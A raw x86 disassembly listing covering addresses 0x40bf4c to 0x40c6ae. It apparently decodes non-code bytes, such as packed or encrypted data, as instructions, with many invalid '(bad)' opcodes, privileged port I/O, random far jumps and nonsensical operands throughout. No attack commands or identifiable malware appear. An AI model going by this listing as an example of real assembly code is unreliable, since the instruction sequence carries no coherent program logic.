  40bf4c:	jne    0x40bed0
  40bf4e:	dec    edx
  40bf4f:	mov    DWORD PTR [ebx],esi
  40bf51:	scas   al,BYTE PTR es:[edi]
  40bf52:	dec    esp
  40bf53:	lock xchg BYTE PTR [ebp-0x24342cd7],ch
  40bf5a:	js     0x40bf97
  40bf5c:	push   ecx
  40bf5d:	int3   
  40bf5e:	push   0xfa0f16c1
  40bf63:	fmul   st,st(3)
  40bf65:	in     al,dx
  40bf66:	outs   dx,DWORD PTR ds:[esi]
  40bf67:	ins    DWORD PTR es:[edi],dx
  40bf68:	and    BYTE PTR [edx-0x53],ah
  40bf6b:	mov    ebp,0xaba7289c
  40bf70:	int    0x7b
  40bf72:	lahf   
  40bf73:	mov    eax,ds:0xc1377ede
  40bf78:	sbb    DWORD PTR [eax+0xc9eb406],0xffffff85
  40bf7f:	cmp    dl,BYTE PTR [edi+0x2cb6fd6d]
  40bf85:	ficom  DWORD PTR [edx-0x33bf572c]
  40bf8b:	dec    ebx
  40bf8c:	push   ecx
  40bf8d:	dec    edx
  40bf8e:	push   0xd5d34307
  40bf93:	mov    ebp,0x49c34a17
  40bf98:	mov    ah,0x9a
  40bf9a:	rcr    BYTE PTR [eax+0x1b],0x56
  40bf9e:	sbb    dh,BYTE PTR [ebx-0x48]
  40bfa1:	adc    al,0xf
  40bfa3:	and    al,0x7c
  40bfa5:	adc    edx,DWORD PTR [ebx+ebp*2-0x26]
  40bfa9:	jmp    0xbae1:0xf89f25f0
  40bfb0:	xchg   ecx,eax
  40bfb1:	mov    edi,0x53d190e6
  40bfb6:	mov    esp,0x8038de2c
  40bfbb:	aas    
  40bfbc:	pop    es
  40bfbd:	aas    
  40bfbe:	sbb    eax,ebp
  40bfc0:	jae    0x40bfdc
  40bfc2:	mov    ch,0x14
  40bfc4:	(bad)  
  40bfc5:	(bad)  
  40bfc6:	jno    0x40c010
  40bfc8:	out    dx,al
  40bfc9:	jp     0x40c01a
  40bfcb:	es jo  0x40bf5b
  40bfce:	inc    ebp
  40bfcf:	out    0x4e,al
  40bfd1:	cwde   
  40bfd2:	pop    es
  40bfd3:	jle    0x40bff1
  40bfd5:	inc    ebp
  40bfd6:	pop    edi
  40bfd7:	mov    edx,0x5237bd87
  40bfdc:	ss mov esi,0x992eff3a
  40bfe2:	stos   DWORD PTR es:[edi],eax
  40bfe3:	or     al,0x14
  40bfe5:	inc    ebx
  40bfe6:	cmp    DWORD PTR [edi+0x19d288ca],eax
  40bfec:	xchg   esp,eax
  40bfed:	cmp    BYTE PTR [eax+ebx*4+0x5be9169c],al
  40bff4:	xor    al,0xc0
  40bff6:	(bad)  [ecx*1-0x5efeb8b3]
  40bffd:	adc    ecx,DWORD PTR [edx+0x24]
  40c000:	push   cs
  40c001:	dec    edi
  40c002:	(bad)  
  40c003:	das    
  40c004:	jmp    0x8f849b49
  40c009:	jg     0x40c074
  40c00b:	imul   ecx,DWORD PTR [ecx],0x5daeeac4
  40c011:	pop    esp
  40c012:	out    dx,al
  40c013:	mov    eax,0xf3101083
  40c018:	inc    BYTE PTR [edx+0x27]
  40c01b:	std    
  40c01c:	cwde   
  40c01d:	in     eax,dx
  40c01e:	sbb    DWORD PTR [edx+0x6d],eax
  40c021:	sub    BYTE PTR [ebx],cl
  40c023:	pop    ds
  40c024:	ins    BYTE PTR es:[edi],dx
  40c025:	mov    eax,ds:0xa28a6f03
  40c02a:	repz mov bh,0x24
  40c02d:	mov    cl,0x5f
  40c02f:	pushf  
  40c030:	sbb    eax,0xf772417e
  40c035:	mov    ds:0x872f6c47,eax
  40c03a:	bound  eax,QWORD PTR [ecx]
  40c03c:	es add ebx,ebp
  40c03f:	fldcw  WORD PTR [ecx]
  40c041:	dec    esi
  40c042:	sti    
  40c043:	pop    ds
  40c044:	jb     0x40c034
  40c046:	(bad)  
  40c048:	hlt    
  40c049:	pop    ds
  40c04a:	mov    bl,0xcc
  40c04c:	mov    eax,0xd64f633c
  40c051:	js     0x40c06e
  40c053:	ins    DWORD PTR es:[edi],dx
  40c054:	repz leave 
  40c056:	jmp    0x223c2dac
  40c05b:	xor    DWORD PTR [ebx],0xb0fcb819
  40c061:	ds jg  0x40c094
  40c064:	jp     0x40c06b
  40c066:	push   edi
  40c067:	out    0xa3,al
  40c069:	test   al,0x51
  40c06b:	das    
  40c06c:	mov    DWORD PTR [ecx],ecx
  40c06e:	mov    al,0x68
  40c070:	pusha  
  40c071:	aas    
  40c072:	(bad)  
  40c073:	cli    
  40c074:	test   bl,ah
  40c076:	retf   
  40c077:	push   edi
  40c078:	popf   
  40c079:	mov    ah,0x50
  40c07b:	adc    BYTE PTR [eax+0x7b],ch
  40c07e:	fwait
  40c07f:	ror    DWORD PTR [edi-0x6e31bdea],0x52
  40c086:	aam    0xc
  40c088:	jmp    0x42b4:0x5932409b
  40c08f:	fldcw  WORD PTR [ecx]
  40c091:	ins    BYTE PTR es:[edi],dx
  40c092:	mov    ebp,0xdfe18c36
  40c097:	mov    BYTE PTR [eax],cl
  40c099:	jg     0x40c0a0
  40c09b:	xlat   BYTE PTR ds:[ebx]
  40c09c:	sub    esi,esp
  40c09e:	adc    DWORD PTR [esi],ebp
  40c0a0:	daa    
  40c0a1:	lea    edi,[ebx+0x100601a3]
  40c0a7:	sbb    esp,esp
  40c0a9:	je     0x40c089
  40c0ab:	ds test eax,0x121d387
  40c0b1:	jle    0x40c0e4
  40c0b3:	sub    edi,0xfffffff3
  40c0b6:	je     0x40c0e0
  40c0b8:	hlt    
  40c0b9:	js     0x40c0eb
  40c0bb:	mov    ds:0x41e61769,eax
  40c0c0:	jnp    0x40c0b7
  40c0c2:	cmp    esp,DWORD PTR [esi+edx*2-0x36]
  40c0c6:	(bad)  
  40c0c7:	and    BYTE PTR [eax-0x34],ch
  40c0ca:	dec    ebp
  40c0cb:	rcr    DWORD PTR [ebx-0x510503a4],0x5d
  40c0d2:	mov    dl,0x41
  40c0d4:	sbb    eax,0xd5b3dbec
  40c0d9:	mov    eax,ds:0x2465a00f
  40c0de:	pop    ebp
  40c0df:	mov    bl,0x71
  40c0e1:	mov    eax,ds:0x43d441e9
  40c0e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0e7:	pop    ss
  40c0e8:	sahf   
  40c0e9:	les    edx,FWORD PTR [esi+0x676da86d]
  40c0ef:	dec    ebp
  40c0f0:	xchg   BYTE PTR [edi+esi*2-0xf762308],bh
  40c0f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0f8:	xchg   BYTE PTR [edx],bh
  40c0fa:	pop    edi
  40c0fb:	test   eax,0xc1dd0865
  40c100:	pop    es
  40c101:	inc    eax
  40c102:	jg     0x40c115
  40c104:	mov    esp,0xf26bd6e8
  40c109:	shl    dl,0x9
  40c10c:	das    
  40c10d:	pop    edx
  40c10e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c10f:	mov    eax,ds:0x45c96b9c
  40c114:	arpl   WORD PTR [edx-0x308748cb],dx
  40c11a:	fwait
  40c11b:	rcl    BYTE PTR [esi+0x6a],cl
  40c11e:	out    0xa8,al
  40c120:	jle    0x40c0c9
  40c122:	jge    0x40c145
  40c124:	out    dx,al
  40c125:	or     ecx,DWORD PTR [eax-0x17]
  40c128:	cld    
  40c129:	inc    eax
  40c12a:	sub    al,0x50
  40c12c:	or     al,BYTE PTR [ebx+0x34]
  40c12f:	out    0x34,al
  40c131:	(bad)
  40c135:	(bad)  
  40c136:	addr16 aam 0x5a
  40c139:	dec    esi
  40c13a:	in     al,dx
  40c13b:	mov    cl,0x5b
  40c13d:	arpl   WORD PTR [edx+0x705fbdc3],sp
  40c143:	std    
  40c144:	adc    al,0xee
  40c146:	cmp    edi,DWORD PTR [ebp-0x41]
  40c149:	scas   eax,DWORD PTR es:[edi]
  40c14a:	push   ebx
  40c14b:	test   BYTE PTR [edi+0xc00c2f6],ch
  40c151:	imul   ebx,DWORD PTR [edi+0x746867d3],0x5
  40c158:	jl     0x40c197
  40c15a:	leave  
  40c15b:	cdq    
  40c15c:	mov    ds:0xa49c726e,al
  40c161:	mov    ds:0x7772d866,al
  40c166:	pop    ecx
  40c167:	ss pop ecx
  40c169:	mov    ebx,ss
  40c16b:	dec    esi
  40c16c:	or     DWORD PTR [edi-0x2b],esi
  40c16f:	jae    0x40c12a
  40c171:	repnz fcomi st,st(7)
  40c174:	push   ebp
  40c175:	adc    DWORD PTR [ebp-0x73d80f10],ebx
  40c17b:	mov    BYTE PTR [ebx-0x2b],dl
  40c17e:	mov    DWORD PTR [esi+0x6cb64b71],ebx
  40c184:	mov    bl,0x8a
  40c186:	push   cs
  40c187:	and    ah,BYTE PTR [esi-0x160fab69]
  40c18d:	push   esi
  40c18e:	cmc    
  40c18f:	fnstenv [ecx-0x30]
  40c192:	ror    BYTE PTR ds:0x652b5b85,cl
  40c198:	jns    0x40c165
  40c19a:	xor    ebx,DWORD PTR [eax]
  40c19c:	xchg   ebx,eax
  40c19d:	pop    ecx
  40c19e:	jo     0x40c16f
  40c1a0:	push   ebp
  40c1a1:	sbb    eax,0x8d2a4601
  40c1a6:	adc    eax,0x32b5e71e
  40c1ab:	dec    eax
  40c1ac:	lahf   
  40c1ad:	jl     0x40c15d
  40c1af:	(bad)  
  40c1b0:	out    0x59,eax
  40c1b2:	and    esi,DWORD PTR [ebp+0x14f3f030]
  40c1b8:	sub    ah,al
  40c1ba:	xchg   edx,eax
  40c1bb:	rol    BYTE PTR [edi+0x60],1
  40c1be:	fidiv  DWORD PTR [edx]
  40c1c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1c1:	cmp    eax,0x62e241f4
  40c1c7:	mov    ebp,0xb12ad73
  40c1cc:	sbb    DWORD PTR [esi-0x4cd43ad5],eax
  40c1d2:	(bad)
  40c1d5:	mov    edx,edi
  40c1d7:	sbb    eax,0x46efd61f
  40c1dc:	sub    al,0x58
  40c1de:	test   BYTE PTR [ebx+esi*1-0x64950cb7],ch
  40c1e5:	jl     0x40c18e
  40c1e7:	inc    esp
  40c1e8:	js     0x40c258
  40c1ea:	ds pop eax
  40c1ec:	jg     0x40c1bf
  40c1ee:	stc    
  40c1ef:	push   ds
  40c1f0:	sub    ch,BYTE PTR [edi+0x39]
  40c1f3:	popa   
  40c1f4:	mov    bl,0x84
  40c1f6:	test   eax,0x3a1bdd5a
  40c1fb:	inc    edi
  40c1fc:	sub    esp,edx
  40c1fe:	out    0xae,al
  40c200:	bound  esp,QWORD PTR [esi]
  40c202:	mov    ch,0xcc
  40c204:	push   cs
  40c205:	or     eax,0x9dc1fa71
  40c20a:	push   ss
  40c20b:	and    al,0x86
  40c20d:	inc    esp
  40c20e:	cs xchg edx,eax
  40c210:	ja     0x40c1e8
  40c212:	cmp    edi,DWORD PTR [edi]
  40c214:	adc    dh,0x1c
  40c217:	stc    
  40c218:	call   0x5e55c722
  40c21d:	stos   BYTE PTR es:[edi],al
  40c21e:	mov    cs,WORD PTR [eax-0x70]
  40c221:	mov    dl,0x5d
  40c223:	sub    al,BYTE PTR [ebp-0x2ea8ab8]
  40c229:	inc    edx
  40c22a:	xchg   ebp,eax
  40c22b:	fwait
  40c22c:	mov    ebx,0x2130de77
  40c231:	adc    DWORD PTR [edi],edi
  40c233:	mov    al,0x4c
  40c235:	lahf   
  40c236:	xchg   ebx,eax
  40c237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c238:	dec    edi
  40c239:	ror    dl,cl
  40c23b:	adc    cl,cl
  40c23d:	pop    ss
  40c23e:	xchg   edi,eax
  40c23f:	cdq    
  40c240:	bound  edi,QWORD PTR [esi]
  40c242:	loope  0x40c21c
  40c244:	pop    ds
  40c245:	test   DWORD PTR ds:0xb611f362,edi
  40c24b:	sbb    ch,dl
  40c24d:	and    ch,bl
  40c24f:	jp     0x40c232
  40c251:	push   edx
  40c252:	jno    0x40c1f9
  40c254:	lock shl edi,0x52
  40c258:	xchg   ecx,eax
  40c259:	sahf   
  40c25a:	sub    BYTE PTR [eax*1-0x394029e3],0xe6
  40c262:	hlt    
  40c263:	mov    edx,0x3c18411f
  40c268:	leave  
  40c269:	shr    DWORD PTR [edi+0x38],1
  40c26c:	std    
  40c26d:	mov    eax,0x51c0b651
  40c272:	scas   al,BYTE PTR es:[edi]
  40c273:	ins    BYTE PTR es:[edi],dx
  40c274:	rcl    DWORD PTR [edi+0x69],1
  40c277:	in     eax,dx
  40c278:	stos   DWORD PTR es:[edi],eax
  40c279:	jge    0x40c21e
  40c27b:	pop    ebx
  40c27c:	ja     0x40c2da
  40c27e:	jl     0x40c2db
  40c280:	pop    ebx
  40c281:	add    ah,bl
  40c283:	jge    0x40c271
  40c285:	mov    ch,0x14
  40c287:	mov    ah,0xa3
  40c289:	xor    DWORD PTR [ebx],edx
  40c28b:	iret   
  40c28c:	rcr    BYTE PTR [ecx],cl
  40c28e:	xchg   ah,bl
  40c290:	aad    0x62
  40c292:	test   DWORD PTR [edi],edx
  40c294:	test   DWORD PTR [esi-0x348b12a9],ecx
  40c29a:	adc    eax,0x5b636689
  40c29f:	scas   al,BYTE PTR es:[edi]
  40c2a0:	(bad)  [edi]
  40c2a2:	(bad)  
  40c2a3:	jge    0x40c225
  40c2a5:	popf   
  40c2a6:	mov    al,ds:0x2eb361ea
  40c2ab:	stos   DWORD PTR es:[edi],eax
  40c2ac:	adc    edx,0x244853b
  40c2b2:	outs   dx,BYTE PTR ds:[esi]
  40c2b3:	xchg   ecx,eax
  40c2b4:	sbb    BYTE PTR [edx],dh
  40c2b6:	enter  0xe810,0x59
  40c2ba:	stos   DWORD PTR es:[edi],eax
  40c2bb:	retf   0xfd0f
  40c2be:	push   eax
  40c2bf:	inc    eax
  40c2c0:	push   esp
  40c2c1:	outs   dx,BYTE PTR ds:[esi]
  40c2c2:	push   0x1e837f00
  40c2c7:	cli    
  40c2c8:	fnstenv [esi]
  40c2ca:	enter  0x45f2,0xcf
  40c2ce:	xlat   BYTE PTR ds:[ebx]
  40c2cf:	xor    eax,0x2be3da93
  40c2d4:	push   ebx
  40c2d5:	and    al,0xd
  40c2d7:	fisubr WORD PTR [eax+0x79]
  40c2da:	aaa    
  40c2db:	sub    eax,0x8109b80d
  40c2e0:	and    al,BYTE PTR [edx-0x3b]
  40c2e3:	mov    DWORD PTR [eax-0x58357d61],0xb68b3d96
  40c2ed:	cwde   
  40c2ee:	(bad)  
  40c2ef:	fisttp WORD PTR [esi]
  40c2f1:	cmp    ch,BYTE PTR [edi-0x56]
  40c2f4:	dec    esi
  40c2f5:	dec    edx
  40c2f6:	aaa    
  40c2f7:	jb     0x40c291
  40c2f9:	(bad)  
  40c2fb:	mov    esi,0x2f1f0d01
  40c300:	ffree  st(4)
  40c302:	sbb    cl,al
  40c304:	icebp  
  40c305:	jae    0x40c2f2
  40c307:	or     eax,0x631791f0
  40c30c:	inc    edi
  40c30d:	outs   dx,BYTE PTR ds:[esi]
  40c30e:	dec    esp
  40c30f:	fs push edx
  40c311:	or     DWORD PTR [eax+ebx*2],esp
  40c314:	sub    BYTE PTR [esi],cl
  40c316:	lds    eax,FWORD PTR ds:0x6a1ed14a
  40c31c:	aaa    
  40c31d:	cmp    DWORD PTR [ecx+0x4fa5db80],edx
  40c323:	fcmovbe st,st(2)
  40c325:	push   ds
  40c326:	mov    WORD PTR [edi+0x38],fs
  40c329:	xchg   edx,eax
  40c32a:	jge    0x40c369
  40c32c:	test   BYTE PTR [ecx-0x10],ch
  40c32f:	push   ecx
  40c330:	inc    ecx
  40c331:	leave  
  40c332:	imul   ecx,DWORD PTR [edi-0x53fb0ab8],0xffffff82
  40c339:	sti    
  40c33a:	push   ebx
  40c33b:	pop    edi
  40c33c:	fisubr WORD PTR es:[ebx+0x40]
  40c340:	popa   
  40c341:	xchg   esi,eax
  40c342:	or     eax,0x73abccfa
  40c347:	aam    0x5c
  40c349:	dec    edi
  40c34a:	inc    ebx
  40c34b:	out    dx,al
  40c34c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c34d:	xlat   BYTE PTR ds:[ebx]
  40c34e:	or     dh,BYTE PTR [ebx-0x67]
  40c351:	cli    
  40c352:	inc    esp
  40c353:	dec    ecx
  40c354:	enter  0x35d5,0xa1
  40c358:	push   edx
  40c359:	icebp  
  40c35a:	daa    
  40c35b:	pop    edx
  40c35c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c35d:	jb     0x40c37e
  40c35f:	mov    eax,ds:0x5ae0317
  40c364:	xor    ah,ch
  40c366:	and    bh,BYTE PTR [eax-0xae53a63]
  40c36c:	xor    al,0xe1
  40c36e:	jne    0x40c33a
  40c370:	lods   al,BYTE PTR ds:[esi]
  40c371:	inc    esp
  40c372:	ficomp DWORD PTR [ebx]
  40c374:	cmovl  eax,esi
  40c377:	xchg   ecx,eax
  40c378:	nop
  40c379:	mov    bl,0x7
  40c37b:	mov    esp,0x6a42c48
  40c380:	jle    0x40c34c
  40c382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c383:	and    eax,edx
  40c385:	in     al,dx
  40c386:	and    dh,BYTE PTR [eax+0x56010263]
  40c38c:	arpl   WORD PTR [esi-0x6772539],bp
  40c392:	aaa    
  40c393:	shl    WORD PTR [edx-0x33429477],0x9a
  40c39b:	add    DWORD PTR [edi+0x31e0fa17],0x91d4772d
  40c3a5:	push   es
  40c3a6:	ds int3 
  40c3a8:	out    0xf5,al
  40c3aa:	imul   edi,DWORD PTR [edx],0xffffffd6
  40c3ad:	cmp    eax,0x9fc94bbd
  40c3b2:	cmp    DWORD PTR [esi],eax
  40c3b4:	sti    
  40c3b5:	scas   eax,DWORD PTR es:[edi]
  40c3b6:	adc    al,0xaa
  40c3b8:	(bad)  
  40c3ba:	ds sbb al,0x8a
  40c3bd:	js     0x40c41d
  40c3bf:	mov    bl,0xa6
  40c3c1:	mov    dh,BYTE PTR [edi-0x1244eda6]
  40c3c7:	add    BYTE PTR ds:0xdf048f02,dl
  40c3cd:	xchg   ebx,eax
  40c3ce:	mov    ch,0xd7
  40c3d0:	push   ss
  40c3d1:	inc    ecx
  40c3d2:	outs   dx,BYTE PTR ds:[esi]
  40c3d3:	inc    ebp
  40c3d4:	xchg   edi,eax
  40c3d5:	add    BYTE PTR [edx],0xdd
  40c3d8:	jecxz  0x40c3c6
  40c3da:	mov    ebx,0xde1ced5e
  40c3df:	and    BYTE PTR [esi],dh
  40c3e1:	pop    es
  40c3e2:	pop    ds
  40c3e3:	cdq    
  40c3e4:	loop   0x40c43f
  40c3e6:	(bad)  
  40c3e8:	clc    
  40c3e9:	mov    ebp,esp
  40c3eb:	inc    esp
  40c3ec:	js     0x40c3c3
  40c3ee:	fistp  WORD PTR [edx-0x202ffaed]
  40c3f4:	aam    0x24
  40c3f6:	(bad)  
  40c3f7:	hlt    
  40c3f8:	push   esp
  40c3f9:	push   cs
  40c3fa:	push   ebp
  40c3fb:	adc    dh,BYTE PTR [ecx+0x49153544]
  40c401:	not    BYTE PTR [esi+0xd460b93]
  40c407:	sbb    eax,0xc0cc65a1
  40c40c:	inc    ebp
  40c40d:	add    al,0x34
  40c40f:	sub    eax,0x19458951
  40c414:	lahf   
  40c415:	jae    0x40c460
  40c417:	pop    esi
  40c418:	stos   BYTE PTR es:[edi],al
  40c419:	cmp    DWORD PTR [edi-0x3d2cac48],edi
  40c41f:	repnz sar DWORD PTR [edx+0x4a490753],1
  40c426:	push   DWORD PTR [esi+0x7ee1f4f3]
  40c42c:	sbb    al,0xd5
  40c42e:	inc    ecx
  40c42f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c430:	mov    edx,0x11c6e24b
  40c435:	iret   
  40c436:	adc    DWORD PTR [ebx-0x62],ebx
  40c439:	mov    ch,0xfd
  40c43b:	pop    ss
  40c43c:	jno    0x40c490
  40c43e:	(bad)  
  40c43f:	sbb    al,BYTE PTR [edi+esi*1]
  40c442:	jle    0x40c46e
  40c444:	add    BYTE PTR [edi+0x4f],al
  40c447:	imul   ebp,eax,0xd2b0f517
  40c44d:	mov    esp,0x247e1963
  40c452:	sahf   
  40c453:	mov    BYTE PTR [ebx-0x10],dl
  40c456:	xchg   ecx,eax
  40c457:	push   0x7
  40c459:	shr    DWORD PTR [esi-0x7b2f9a9],0xe0
  40c460:	shl    BYTE PTR [eax],1
  40c462:	aad    0x34
  40c464:	or     al,0xeb
  40c466:	fdivr  st,st(3)
  40c468:	inc    edi
  40c469:	aad    0x7f
  40c46b:	xlat   BYTE PTR ds:[ebx]
  40c46c:	addr16 push 0xffffffd3
  40c46f:	inc    eax
  40c470:	inc    edx
  40c471:	inc    ecx
  40c472:	or     eax,0x6fd26ed7
  40c477:	pop    ebp
  40c478:	cmp    ch,BYTE PTR [edx]
  40c47a:	mov    BYTE PTR [edi],cl
  40c47c:	pop    ecx
  40c47d:	pop    edx
  40c47e:	mov    edi,0xc0cf9ee3
  40c483:	or     bl,ah
  40c485:	push   edx
  40c486:	and    edx,DWORD PTR ds:0x4db14ed8
  40c48c:	outs   dx,BYTE PTR ds:[esi]
  40c48d:	sbb    eax,DWORD PTR [esi-0x5d]
  40c490:	nop
  40c491:	mov    ?,WORD PTR [ebx+0x40416da]
  40c497:	and    eax,0xaf81e002
  40c49c:	push   ss
  40c49d:	mov    dh,0x16
  40c49f:	xor    ecx,0xffffffbd
  40c4a2:	cmc    
  40c4a3:	sub    ecx,esp
  40c4a5:	cli    
  40c4a6:	mov    ch,0x46
  40c4a8:	adc    eax,0xd4cf6551
  40c4ad:	out    dx,eax
  40c4ae:	push   edx
  40c4af:	fwait
  40c4b0:	shl    DWORD PTR [edx+eiz*2-0x563d161c],0x2d
  40c4b8:	mov    ecx,0x60d85b5a
  40c4bd:	repz shr BYTE PTR [edi-0x26],1
  40c4c1:	test   BYTE PTR [ecx],ch
  40c4c3:	out    dx,al
  40c4c4:	gs jb  0x40c4eb
  40c4c7:	pusha  
  40c4c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4c9:	mov    ecx,0x11fa4c4f
  40c4ce:	sahf   
  40c4cf:	push   edi
  40c4d0:	fmulp  st(7),st
  40c4d2:	imul   edi,DWORD PTR [edx-0x1d],0xffffffbb
  40c4d6:	xor    al,0x58
  40c4d8:	push   ebp
  40c4d9:	cmp    ah,0xb1
  40c4dc:	adc    al,0x5b
  40c4de:	jnp    0x40c504
  40c4e0:	ret    
  40c4e1:	dec    edx
  40c4e2:	mov    eax,ds:0xd0642660
  40c4e7:	add    BYTE PTR [edi-0x8934c62],ah
  40c4ed:	(bad)  
  40c4ef:	cwde   
  40c4f0:	xchg   eax,edx
  40c4f2:	pop    esp
  40c4f3:	out    0xdb,eax
  40c4f5:	push   eax
  40c4f6:	mov    ebx,0xf3761d45
  40c4fb:	mov    ebx,0x720b3f3a
  40c500:	and    bl,al
  40c502:	fadd   DWORD PTR [ebx]
  40c504:	xor    al,0x96
  40c506:	aam    0xca
  40c508:	in     al,0x26
  40c50a:	mov    dl,0x71
  40c50c:	test   DWORD PTR [ebx],edi
  40c50e:	xchg   DWORD PTR [eax-0x34],ecx
  40c511:	pop    edx
  40c512:	test   al,0x9d
  40c514:	xchg   esp,eax
  40c515:	outs   dx,BYTE PTR ds:[esi]
  40c516:	dec    eax
  40c517:	shl    BYTE PTR [esi-0x6ab2f830],1
  40c51d:	sbb    ah,0x84
  40c520:	outs   dx,BYTE PTR ds:[esi]
  40c521:	ds mov esp,0x55d51714
  40c527:	pop    esi
  40c528:	adc    eax,0x4bd8dc53
  40c52d:	rcl    BYTE PTR [ecx-0x38d07f23],0x37
  40c534:	les    ebx,FWORD PTR [edi]
  40c536:	in     eax,dx
  40c537:	out    0xed,al
  40c539:	mov    edx,0xbd8cd4a1
  40c53e:	gs mov edx,0x55990c88
  40c544:	mov    ebp,0x3fbe862e
  40c549:	push   edx
  40c54a:	or     eax,0x9151ac30
  40c54f:	mov    dl,0xdc
  40c551:	js     0x40c535
  40c553:	mov    dl,0xfd
  40c555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c556:	xor    dh,BYTE PTR [edi-0x1b4b355d]
  40c55c:	adc    al,0x76
  40c55e:	dec    ebp
  40c55f:	adc    eax,0x6c1299f5
  40c564:	fisttp QWORD PTR [ecx]
  40c566:	out    dx,al
  40c567:	fwait
  40c568:	xchg   ecx,eax
  40c569:	dec    eax
  40c56a:	imul   DWORD PTR ds:0x6a44384
  40c570:	sbb    DWORD PTR [ebx+0x63],0xffffffa7
  40c574:	nop
  40c575:	push   0xc6223174
  40c57a:	rol    DWORD PTR [esi],0x8b
  40c57d:	push   ebx
  40c57e:	push   esi
  40c57f:	sub    eax,0x7e0f49f
  40c584:	enter  0x56b0,0x91
  40c588:	cwde   
  40c589:	xlat   BYTE PTR ds:[ebx]
  40c58a:	inc    esi
  40c58b:	lea    eax,[ebx-0x26]
  40c58e:	xchg   esp,eax
  40c58f:	add    BYTE PTR [edx+0x11],bh
  40c592:	pop    eax
  40c593:	fnstsw WORD PTR [edi]
  40c595:	sbb    edx,DWORD PTR [edi+0x54]
  40c598:	(bad)  
  40c599:	daa    
  40c59a:	mov    ds:0x54294787,eax
  40c59f:	cmp    al,0x1c
  40c5a1:	and    dl,BYTE PTR [edx]
  40c5a3:	add    DWORD PTR [eax],ebp
  40c5a5:	sahf   
  40c5a6:	scas   al,BYTE PTR es:[edi]
  40c5a7:	out    0x4e,eax
  40c5a9:	sub    DWORD PTR [edi-0x2b69d63d],esi
  40c5af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5b0:	jo     0x40c550
  40c5b2:	test   DWORD PTR [ecx-0x2fb8cde0],eax
  40c5b8:	out    0x23,eax
  40c5ba:	dec    esp
  40c5bb:	jecxz  0x40c578
  40c5bd:	fwait
  40c5be:	mov    ss:0x8353aab1,al
  40c5c4:	xchg   edi,eax
  40c5c5:	dec    esp
  40c5c6:	mov    eax,DWORD PTR [esi-0xb8c65af]
  40c5cc:	test   BYTE PTR [ebp+eax*4-0x60],ch
  40c5d0:	sub    BYTE PTR es:[ebx-0x4],dh
  40c5d4:	enter  0x2d75,0x1f
  40c5d8:	(bad)  
  40c5d9:	aam    0xed
  40c5db:	mov    al,0xff
  40c5dd:	mov    edi,DWORD PTR [edx+0x41]
  40c5e0:	rol    DWORD PTR [edx-0x15],0x46
  40c5e4:	push   edx
  40c5e5:	inc    ebx
  40c5e6:	push   es
  40c5e7:	add    eax,0x865f1471
  40c5ec:	(bad)  
  40c5ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5ee:	add    dl,BYTE PTR [eax+edx*2]
  40c5f1:	nop
  40c5f2:	mov    ds:0x6aa71fd1,al
  40c5f7:	imul   ecx,DWORD PTR [esi],0xffffffba
  40c5fa:	gs dec esi
  40c5fc:	sub    DWORD PTR [ebx+0x45],ebp
  40c5ff:	add    BYTE PTR [esi+eax*8+0x6f],0xab
  40c604:	dec    edx
  40c605:	in     eax,dx
  40c606:	or     eax,0x9cbd1a7f
  40c60b:	aad    0x90
  40c60d:	add    eax,0x82759676
  40c612:	or     ah,0xbe
  40c615:	jb     0x40c67c
  40c617:	push   esp
  40c618:	ror    al,1
  40c61a:	aad    0x4f
  40c61c:	fs inc esi
  40c61e:	lahf   
  40c61f:	mov    BYTE PTR [edi],bl
  40c621:	addr16 nop
  40c623:	shl    ah,cl
  40c625:	inc    ebp
  40c626:	cmp    BYTE PTR [eax-0x3ab0a2ee],dh
  40c62c:	aaa    
  40c62d:	or     DWORD PTR [ecx-0x17],ebp
  40c630:	(bad)  
  40c631:	fisttp WORD PTR [eax]
  40c633:	xor    al,0x36
  40c635:	mov    bh,0x6
  40c637:	pop    ss
  40c638:	aas    
  40c639:	adc    dl,dl
  40c63b:	or     DWORD PTR [ebx],ebx
  40c63d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c63e:	pop    edi
  40c63f:	push   cs
  40c640:	xor    BYTE PTR [edi-0x1b6726c6],dl
  40c646:	ds std 
  40c648:	stos   BYTE PTR es:[edi],al
  40c649:	or     edx,DWORD PTR [edi+0x7f]
  40c64c:	dec    ebx
  40c64d:	ret    
  40c64e:	fs mov al,0xd8
  40c651:	cmp    ebx,DWORD PTR [ecx]
  40c653:	retf   0xd298
  40c656:	repz lds eax,FWORD PTR [edx]
  40c659:	aam    0xc
  40c65b:	je     0x40c640
  40c65d:	repz mov ds:0xf28fd551,eax
  40c663:	retf   
  40c664:	scas   eax,DWORD PTR es:[edi]
  40c665:	in     eax,dx
  40c666:	loopne 0x40c672
  40c668:	push   ebp
  40c669:	pusha  
  40c66a:	pop    ebx
  40c66b:	fldenv [ebx-0x30c33ff8]
  40c671:	(bad)  
  40c672:	cwde   
  40c673:	lds    esi,FWORD PTR [ebp-0xc]
  40c676:	out    0xa5,al
  40c678:	(bad)  
  40c679:	aaa    
  40c67a:	mov    ebp,0x85e1c7e2
  40c67f:	push   edx
  40c680:	fs in  al,dx
  40c682:	xchg   esp,eax
  40c683:	jns    0x40c6b9
  40c685:	mov    dl,BYTE PTR es:[eax+0x507e6ac6]
  40c68c:	les    esp,FWORD PTR [ecx-0x154512b9]
  40c692:	xor    eax,0x7b360e65
  40c697:	jmp    0x59a9c2cf
  40c69c:	ja     0x40c6a1
  40c69e:	or     ebp,DWORD PTR [eax-0x33]
  40c6a1:	pop    ss
  40c6a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6a3:	leave  
  40c6a4:	call   0x3924:0x72a2d5ea
  40c6ab:	xchg   edi,eax
  40c6ac:	cld    
  40c6ad:	push   cs
  40c6ae:	in     eax,0x0
